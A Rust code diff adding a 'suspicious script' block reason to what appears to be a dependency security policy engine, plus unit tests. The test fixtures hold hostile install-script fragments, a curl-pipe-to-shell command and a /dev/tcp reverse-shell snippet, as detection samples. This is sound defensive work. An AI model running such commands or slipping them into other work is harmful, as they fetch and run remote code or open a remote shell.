@@ -241,6 +241,17 @@ impl Policy {
                 });
             }
         }
+        // ── Suspicious script bodies ────────────────────────────────────
+        // Always-on: the signal is pure evidence (regex matched), so the
+        // policy lever is the standard severity map. Default `block`,
+        // demote with `severity.suspicious-script: warn` for rollout.
+        for (script, pattern, excerpt) in signals.suspicious_scripts() {
+            reasons.push(Reason::SuspiciousScript {
+                script: script.to_string(),
+                pattern: pattern.to_string(),
+                excerpt: excerpt.to_string(),
+            });
+        }
         // ── Surface unavailability so it isn't silently swallowed ───────
         for sig in &signals.signals {
             if let crate::signal::Signal::Unavailable { provider, reason } = sig {
@@ -791,5 +802,74 @@ mod tests {
             Utc::now(),
         );
         assert!(matches!(transitive, Decision::Allow));
+    }
+
+    #[test]
+    fn suspicious_script_blocks_by_default() {
+        let p = Policy::default();
+        let mut signals = SignalSet::default();
+        signals.push(Signal::SuspiciousScript {
+            script: "postinstall".into(),
+            pattern: "curl-pipe-shell".into(),
+            excerpt: "curl https://x | sh".into(),
+        });
+        let d = p.evaluate(
+            &dep("evil", false, Source::Registry { url: "x".into() }),
+            &signals,
+            Utc::now(),
+        );
+        match d {
+            Decision::Block { reasons } => {
+                assert_eq!(reasons.len(), 1);
+                assert_eq!(reasons[0].code(), "suspicious-script");
+            }
+            other => panic!("expected Block, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn suspicious_script_demotable_to_warn() {
+        let p =
+            Policy::from_yaml("policyVersion: 1\nseverity:\n  suspicious-script: warn\n").unwrap();
+        let mut signals = SignalSet::default();
+        signals.push(Signal::SuspiciousScript {
+            script: "postinstall".into(),
+            pattern: "curl-pipe-shell".into(),
+            excerpt: "curl https://x | sh".into(),
+        });
+        let d = p.evaluate(
+            &dep("evil", false, Source::Registry { url: "x".into() }),
+            &signals,
+            Utc::now(),
+        );
+        assert!(matches!(d, Decision::Warn { .. }), "got {d:?}");
+    }
+
+    #[test]
+    fn suspicious_script_emits_one_reason_per_finding() {
+        let p = Policy::default();
+        let mut signals = SignalSet::default();
+        signals.push(Signal::SuspiciousScript {
+            script: "postinstall".into(),
+            pattern: "curl-pipe-shell".into(),
+            excerpt: "curl https://x | sh".into(),
+        });
+        signals.push(Signal::SuspiciousScript {
+            script: "postinstall".into(),
+            pattern: "dev-tcp-reverse-shell".into(),
+            excerpt: "/dev/tcp/h/9".into(),
+        });
+        let d = p.evaluate(
+            &dep("evil", false, Source::Registry { url: "x".into() }),
+            &signals,
+            Utc::now(),
+        );
+        match d {
+            Decision::Block { reasons } => {
+                assert_eq!(reasons.len(), 2);
+                assert!(reasons.iter().all(|r| r.code() == "suspicious-script"));
+            }
+            other => panic!("expected Block, got {other:?}"),
+        }
     }
 }
